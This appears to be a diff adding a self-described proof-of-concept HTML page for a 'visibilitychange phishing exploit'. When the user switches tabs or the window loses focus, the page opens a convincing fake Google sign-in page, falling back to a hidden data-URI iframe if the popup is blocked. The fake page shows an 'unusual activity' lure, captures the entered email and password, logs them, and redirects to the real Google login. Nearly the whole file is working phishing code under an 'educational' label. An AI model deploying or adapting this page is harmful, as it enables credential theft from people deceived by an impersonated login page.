@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced PoC: visibilitychange Phishing Exploit</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        .test-area {
+            border: 2px dashed #dc3545;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        #status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .active {
+            background: #d4edda;
+            color: #155724;
+        }
+        .hidden {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .instructions {
+            background: #e7f3ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Advanced PoC: visibilitychange Phishing Exploit</h1>
+        
+        <div class="warning">
+            <strong>⚠️ Security Warning:</strong> This is a proof of concept demonstrating a real security vulnerability. 
+            For educational purposes only.
+        </div>
+
+        <div class="instructions">
+            <h3>How to test:</h3>
+            <ol>
+                <li>Keep this tab open</li>
+                <li>Switch to another tab or minimize the browser</li>
+                <li>A new tab will automatically open with Google phishing login</li>
+                <li>Try entering credentials to see the exploit work</li>
+            </ol>
+        </div>
+
+        <div class="test-area">
+            <h3>Exploit Test Area</h3>
+            <p>Current status: <span id="status" class="active">Page Visible</span></p>
+            <button onclick="alert('Now switch tabs to see the phishing page open automatically!')">
+                Click Me Then Switch Tabs
+            </button>
+            <p><small>Try opening a new tab or minimizing the window</small></p>
+        </div>
+
+        <!-- Hidden iframe for exploitation -->
+        <iframe id="phishingFrame" style="width:0;height:0;border:0;visibility:hidden"></iframe>
+
+        <div style="margin-top: 20px;">
+            <h3>Exploit Chain:</h3>
+            <ul>
+                <li>1. User switches tabs → visibilitychange triggered</li>
+                <li>2. NEW TAB automatically opens with Google phishing login</li>
+                <li>3. User enters credentials → Stolen by attacker</li>
+                <li>4. Redirect to real Google after capturing credentials</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        let exploitTriggered = false;
+
+        document.addEventListener('visibilitychange', function() {
+            const status = document.getElementById('status');
+            
+            if (document.hidden && !exploitTriggered) {
+                exploitTriggered = true;
+                status.textContent = 'Page Hidden - PHISHING TAB OPENED!';
+                status.className = 'hidden';
+                
+                console.log('Page hidden - opening phishing tab directly');
+                
+                // Directly open phishing login page in new tab
+                openPhishingTab();
+            } else {
+                status.textContent = 'Page Visible';
+                status.className = 'active';
+            }
+        });
+
+        function openPhishingTab() {
+            const phishingHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .google-logo {
+            font-size: 42px;
+            font-weight: 500;
+            color: #4285f4;
+            margin-bottom: 10px;
+        }
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 40px;
+            width: 100%;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        .security-alert {
+            background: #fef7e0;
+            border: 1px solid #fde293;
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .alert-icon {
+            color: #f9ab00;
+            font-weight: bold;
+            margin-right: 8px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border: 2px solid #1a73e8;
+        }
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        .info {
+            color: #5f6368;
+            font-size: 14px;
+            margin: 30px 0;
+            line-height: 1.5;
+        }
+        .info a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .info a:hover {
+            text-decoration: underline;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .next-button:hover {
+            background: #1669d6;
+        }
+        .footer {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            color: #5f6368;
+            font-size: 12px;
+        }
+        .footer select {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 5px;
+            color: #5f6368;
+        }
+        .language {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .help {
+            display: flex;
+            gap: 15px;
+        }
+        .help a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        .help a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <div class="google-logo">Google</div>
+        </div>
+        
+        <div class="card">
+            <h1>Sign in</h1>
+            <div class="subtitle">Use your Google Account</div>
+            
+            <div class="security-alert">
+                <span class="alert-icon">⚠</span>
+                <strong>Security verification required</strong>
+                <p style="margin-top: 5px;">We've detected unusual activity. Please verify it's you.</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="email" id="email" placeholder="Email or phone" required autofocus>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <div class="info">
+                    Not your computer? Use Guest mode to sign in privately. 
+                    <a href="#">Learn more</a>
+                </div>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <div class="language">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Bahasa Indonesia</option>
+                    <option>Español</option>
+                </select>
+            </div>
+            
+            <div class="help">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Capture credentials (in real attack, send to attacker server)
+            console.log('🔥 CREDENTIALS CAPTURED:');
+            console.log('Email:', email);
+            console.log('Password:', password);
+            console.log('Timestamp:', new Date().toISOString());
+            console.log('User Agent:', navigator.userAgent);
+            
+            // Show loading and redirect to real Google
+            const button = this.querySelector('.next-button');
+            button.textContent = 'Verifying...';
+            button.disabled = true;
+            
+            setTimeout(() => {
+                alert('✅ Signed in successfully!');
+                window.location.href = 'https://accounts.google.com';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>`;
+
+            try {
+                // Method 1: Open new tab and write content
+                const newTab = window.open('', '_blank');
+                if (newTab) {
+                    newTab.document.write(phishingHTML);
+                    newTab.document.close();
+                    newTab.focus();
+                    console.log('Phishing tab opened successfully');
+                } else {
+                    // Fallback if popup blocked
+                    console.log('Popup blocked, using iframe method');
+                    fallbackMethod();
+                }
+            } catch (e) {
+                console.error('Error opening phishing tab:', e);
+                fallbackMethod();
+            }
+        }
+
+        function fallbackMethod() {
+            // Fallback using iframe with data URI
+            try {
+                const frame = document.getElementById('phishingFrame');
+                const dataURI = 'data:text/html;base64,' + btoa(phishingHTML);
+                frame.src = dataURI;
+            } catch (e) {
+                console.error('Fallback also failed:', e);
+            }
+        }
+
+        // Additional trigger for window blur
+        window.addEventListener('blur', function() {
+            if (!exploitTriggered) {
+                setTimeout(() => {
+                    if (document.hidden) {
+                        openPhishingTab();
+                    }
+                }, 100);
+            }
+        });
+
+        console.log('🔒 Phishing PoC loaded. Switch tabs to see phishing page open automatically.');
+    </script>
+</body>
+</html>
